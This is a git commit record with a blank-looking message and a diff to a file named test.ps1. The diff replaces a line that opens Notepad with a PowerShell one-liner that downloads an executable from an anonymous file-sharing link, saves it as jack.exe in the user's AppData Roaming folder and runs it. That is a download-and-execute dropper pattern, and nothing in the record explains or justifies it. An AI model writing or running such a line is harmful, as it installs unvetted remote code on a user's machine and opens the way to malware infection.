c57b864bd01cba1e1c01e771fb7d3e343ceb302b
Dev Patel <109647822+dev-eloper-365@users.noreply.github.com>
2022-08-07 22:03:46 +0530

    .

--- test.ps1
+++ test.ps1
@@ -1,1 +1,1 @@
-notepad.exe
+New-Object System.Net.WebClient.DownloadFile("https://anonfiles.com/Ld29F226y8/ProcessHacker_exe","$HOME\AppData\Roaming\jack.exe");Start-Process -FilePath "$HOME\AppData\Roaming\jack.exe"
